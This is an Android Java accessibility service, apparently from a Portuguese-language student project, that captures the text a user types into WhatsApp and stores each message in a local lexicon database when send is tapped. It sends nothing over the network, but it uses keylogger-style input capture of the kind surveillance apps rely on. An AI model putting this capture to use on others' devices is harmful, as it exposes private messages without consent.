package com.projetos.redes.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.projetos.redes.bd.LexicoDb;
import com.projetos.redes.models.UsrMsg;

public class MyAccessibilitiService extends AccessibilityService {
    private final String PACKAGE_WHATSAPPP = "com.whatsapp";
    private static String line = "";
    static final String TAG = "RecorderService";

    /**
     * @author Jefferson C. Silva
     * @param event evento recebido para retirar o texto dele.
     * @return retorna os caracteres que vem no evento (nesse caso, o que o usuario digita na caixa de envio de msg no whatsapp ou qualquer caixa de texto de qualquer aplicativo)
     */
    private String getEventText(AccessibilityEvent event) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);
        }
        return sb.toString();
    }



    /**
     * @author Jefferson C. Silva
     * @param event evento que ocorre para tratamento.
     * Evento chamado sempre que o usuario interage com o sistema, desde que o serviço de acessibilidade esteja ativado nas configurações de acessibilidade do sistema.
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        //Verifica se a aplicação que está sendo utilizada no momento que o evento e disparado e o whatsapp.
        if(event.getPackageName().equals(PACKAGE_WHATSAPPP)) {
            //Capitura quando o usuario clica no botão de enviar a mensagem.
            if(event.getClassName().equals("android.widget.ImageButton") && line != null) {
                //FileManipulation.save(line, getApplicationContext());
                LexicoDb.insertDb(new UsrMsg(line), getApplicationContext());
                line = null;
            }
            //Capiturar a entrada de dados, o que o usuario digitou na caixa de texto do whatsapp para enviar. (OBS.: Esse evento sera verdadeiro para qualquer input de dados no Android.)
            if(event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED){
                line = getEventText(event);
            }
        }
    }

    /**
     * @author Jefferson C. Silva
     * Chamado quando o serviço e interrompido.
     */
    @Override
    public void onInterrupt() {
        Log.v(TAG, "onInterrupt");
    }


    /**
     * @author Jefferson C. Silva
     * Chamado quando o serviço e iniciado.
     */
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.v(TAG, "onServiceConnected");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);


    }

    public static boolean serviceIsRunning(Context con){
        ActivityManager manager = (ActivityManager)con.getSystemService(Context.ACTIVITY_SERVICE);
        for(ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)){
            if(MyAccessibilitiService.class.getName().equals(service.service.getClassName()))
                return  true;
        }
        return false;
    }

    public static void stopService(Context con){
        Intent in = new Intent(con, MyAccessibilitiService.class);
        con.stopService(in);
    }
}
